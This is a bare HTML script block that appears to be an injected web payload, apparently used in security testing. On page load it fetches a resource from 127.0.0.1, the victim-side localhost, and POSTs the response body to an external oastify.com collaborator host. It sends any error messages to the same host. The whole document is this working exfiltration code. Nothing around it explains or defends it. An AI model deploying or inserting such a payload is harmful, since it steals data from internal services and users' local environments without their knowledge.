
        <script>


// Function to make the XHR request
function sendRequest() {
    // Create a new XMLHttpRequest object
    var xhr = new XMLHttpRequest();
    
    // Define the URL for the local server
    var localUrl = 'https://127.0.0.1/index.js';
    
    // Define the URL for the external server
    var externalUrl = 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com';

    // Configure it: GET-request for the URL
    xhr.open('GET', localUrl, true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            // Success! Send the response to the external server
            sendToExternalServer(xhr.responseText);
        } else {
            console.error('Error: Failed to retrieve data from the local server');
            sendPingWithError(`Failed to retrieve data from local server with status: ${xhr.status}`);
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
        sendPingWithError('Request to local server failed');
    };

    // Send the request to the local server
    xhr.send();
}

// Function to send the response data to the external server
function sendToExternalServer(data) {
    var xhr = new XMLHttpRequest();

    // Configure it: POST-request for the URL
    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    xhr.setRequestHeader('Content-Type', 'application/json');

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            console.log('Success: Data sent to the external server');
        } else {
            console.error('Error: Failed to send data to the external server');
            sendPingWithError(`Failed to send data to external server with status: ${xhr.status}`);
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
        sendPingWithError('Request to external server failed');
    };

    // Send the request with the data
    xhr.send(JSON.stringify({ content: data }));
}

// Function to send a ping with an error message
function sendPingWithError(errorMessage) {
    var xhr = new XMLHttpRequest();

    // Configure it: POST-request for the URL
    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    xhr.setRequestHeader('Content-Type', 'application/json');

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            console.log('Success: Error message sent to the external server');
        } else {
            console.error('Error: Failed to send error message to the external server');
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
    };

    // Send the request with the error message
    xhr.send(JSON.stringify({ error: errorMessage }));
}

// Call the function to initiate the requests
sendRequest();


</script>
